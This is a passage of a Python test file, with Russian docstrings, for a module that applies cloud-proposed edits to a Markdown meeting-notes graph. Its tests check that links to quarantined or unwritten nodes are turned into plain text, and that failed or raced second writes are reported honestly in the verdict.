    monkeypatch.setitem(sys.modules, "meeting_archive", type(sys)("meeting_archive"))
    sys.modules["meeting_archive"].archive_meeting = (
        lambda *a, **k: called.append("archive") or None)
    sys.modules["meeting_archive"].SUMMARY_POLICY_LIVE = frozenset()   # политика саммари живого пути (№314)
    import io
    buf = io.StringIO()
    cloud_review.deliver_review(rev, transcript, graph, "2026-07-15_1400", buf)
    assert called == ["archive"], "раскладка встречи отменена из-за ревизии"
    assert "не в UTF-8" in buf.getvalue(), buf.getvalue()


def test_a_link_to_a_new_node_that_never_lands_becomes_text(tmp_path):
    """№273. Узел, ушедший в карантин, не должен оставаться живой целью:
    `[[ссылка]]` на него из другой правки переживала unlink-гейт и не попадала
    в журнал снятых — узла нет, а ссылка цела. Снятие идёт по факту графа,
    поэтому случай закрыт тем же одним правилом.

    Здесь облако заводит узел в ЗАЩИЩЁННОЙ зоне (judge вернёт `removed`) и
    ссылается на него из обычного узла.
    """
    graph = _graph(tmp_path)
    node = graph / "Встречи" / "2026-07-15_1400.md"

    def work(pen):
        (pen / "Встречи-архив").mkdir(exist_ok=True)
        (pen / "Встречи-архив" / "Новый.md").write_text("# Новый\nтело\n", encoding="utf-8")
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\n## Связи\nсм. [[Встречи-архив/Новый]]\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, work)
    assert "Встречи-архив/Новый.md" in v.removed, v
    assert not (graph / "Встречи-архив" / "Новый.md").exists(), "узел в защищённой зоне не должен лечь"
    text = node.read_text(encoding="utf-8")
    assert "[[Встречи-архив/Новый]]" not in text, "живая ссылка на узел, которого нет"
    assert "см. Новый" in text, "текст ссылки должен остаться текстом (unlink снимает скобки)"
    assert any("Новый" in u for u in v.unlinked), v.unlinked


def test_a_link_to_a_new_node_that_does_land_stays_a_link(tmp_path):
    """Контроль к №273: узел, который реально лёг, целью остаётся — снятие
    работает по факту графа и законную ссылку не трогает."""
    graph = _graph(tmp_path)
    node = graph / "Встречи" / "2026-07-15_1400.md"

    def work(pen):
        (pen / "Системы").mkdir(exist_ok=True)
        (pen / "Системы" / "Квен.md").write_text("# Квен\nмодель\n", encoding="utf-8")
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\n## Связи\nсм. [[Системы/Квен]]\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, work)
    assert (graph / "Системы" / "Квен.md").exists(), v
    assert "[[Системы/Квен]]" in node.read_text(encoding="utf-8"), "законная ссылка снята зря"
    assert not v.unlinked, v.unlinked


def test_a_link_survives_nothing_when_the_write_of_its_target_fails(tmp_path, monkeypatch):
    """№273, круг 1, DS и GLM Critical 1. Запись узла может упасть уже ПОСЛЕ
    того, как решение принято (ENOSPC, права, вытеснение файла из iCloud) —
    предсказание такое не ловит по определению. Снятие ссылок работает по
    факту графа, поэтому случай закрыт тем же одним правилом."""
    graph = _graph(tmp_path)
    node = graph / "Встречи" / "2026-07-15_1400.md"
    real_write = cloud_review.safe_write.write_text

    def flaky(path, text, **kw):
        if path.name == "Квен.md":
            raise OSError(28, "No space left on device")
        return real_write(path, text, **kw)

    monkeypatch.setattr(cloud_review.safe_write, "write_text", flaky)

    def work(pen):
        (pen / "Системы").mkdir(exist_ok=True)
        (pen / "Системы" / "Квен.md").write_text("# Квен\nмодель\n", encoding="utf-8")
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\n## Связи\nсм. [[Системы/Квен]]\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, work)
    assert v.failed == ["Системы/Квен.md"], v
    assert not (graph / "Системы" / "Квен.md").exists(), "узел не записался — его нет"
    text = node.read_text(encoding="utf-8")
    assert "[[Системы/Квен]]" not in text, "живая ссылка на узел, запись которого упала"
    assert "см. Квен" in text
    assert any("Квен" in u for u in v.unlinked), v.unlinked


def test_a_failed_second_write_degrades_into_the_verdict(tmp_path, monkeypatch):
    """№273, круг 2, Critical обеих голов. Отказ ВТОРОЙ записи (снятие мёртвых
    ссылок) обрабатывался строкой с логгером, которого в модуле нет: первый же
    сбой поднимал NameError уже ПОСЛЕ того, как оба прохода всё записали, и
    лог сообщал «ПЕРЕНОС УПАЛ, граф цел» — ложь вдвойне. Логгера здесь и не
    должно быть: stderr воркера уходит в никуда, деградация едет в вердикт."""
    graph = _graph(tmp_path)
    node = graph / "Встречи" / "2026-07-15_1400.md"
    real_write = cloud_review.safe_write.write_text
    seen: list[str] = []

    def flaky(path, text, **kw):
        if path.name == "2026-07-15_1400.md":
            seen.append(path.name)
            if len(seen) > 1:                     # вторая запись — та самая, со снятием
                raise OSError(28, "No space left on device")
        return real_write(path, text, **kw)

    monkeypatch.setattr(cloud_review.safe_write, "write_text", flaky)

    def work(pen):
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\n## Связи\nсм. [[Системы/Нет такого узла]]\n", encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, work)
    assert len(seen) == 2, f"второй записи не было ({len(seen)}) — тест не о том"
    assert v.applied == ["Встречи/2026-07-15_1400.md"], v
    assert v.unlink_failed and "2026-07-15_1400" in v.unlink_failed[0], v.unlink_failed
    assert not v.unlinked, "снятия не было — в журнал писать нечего"
    assert "мёртвые ссылки ОСТАЛИСЬ" in cloud_review._verdict_line(v, qdir)
    assert "[[Системы/Нет такого узла]]" in node.read_text(encoding="utf-8"), \
        "текст облака записан первой записью, снятие не удалось — так и должно быть видно"


def test_a_vanished_file_is_not_accused_of_keeping_dead_links(tmp_path):
    """№273, круг 3, DS Critical 1. Файл мог исчезнуть между записью переноса
    и проходом снятия: конвейер переименовал или слил узел, сработало
    «забыть встречу», iCloud вытеснил. Мёртвых ссылок в несуществующем файле
    не бывает — говорить «остались» значит врать в единственном канале
    воркера, где логгера нет намеренно."""
    graph = _graph(tmp_path)
    v = cloud_review.Verdict(touched=1, applied=["Люди/Иван.md"])   # файла в графе нет

    cloud_review.unlink_after_transfer(v, graph)

    assert not v.unlink_failed, v.unlink_failed
    assert "мёртвые ссылки ОСТАЛИСЬ" not in cloud_review._verdict_line(v, tmp_path / "q")


def test_a_lost_race_on_the_second_write_is_named_once_and_honestly(tmp_path, monkeypatch):
    """№273, круг 4, DS I4. Ветка `LostRace` в пост-проходе не была покрыта:
    её формат («имя файла не дублируется», причина из атрибута) держался ни на
    чём. Здесь обе попытки `rewrite_file` теряют гонку — файл на месте, ссылки
    в нём остались, и вердикт говорит об этом прямо и один раз."""
    graph = _graph(tmp_path)
    real_write = cloud_review.safe_write.write_text
    seen: list[str] = []

    def flaky(path, text, expect=None, **kw):
        if path.name == "2026-07-15_1400.md":
            seen.append(path.name)
            if len(seen) > 1:
                return False                      # снимок не совпал: гонка проиграна
        return real_write(path, text, expect=expect, **kw)

    monkeypatch.setattr(cloud_review.safe_write, "write_text", flaky)

    def work(pen):
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\n## Связи\nсм. [[Системы/Нет такого узла]]\n", encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, work)
    assert v.unlink_failed, v
    line = v.unlink_failed[0]
    assert line.count("2026-07-15_1400") == 1, line      # имя один раз, не дважды
    assert "сменились под рукой" in line, line
    assert "мёртвые ссылки ОСТАЛИСЬ" in cloud_review._verdict_line(v, qdir)
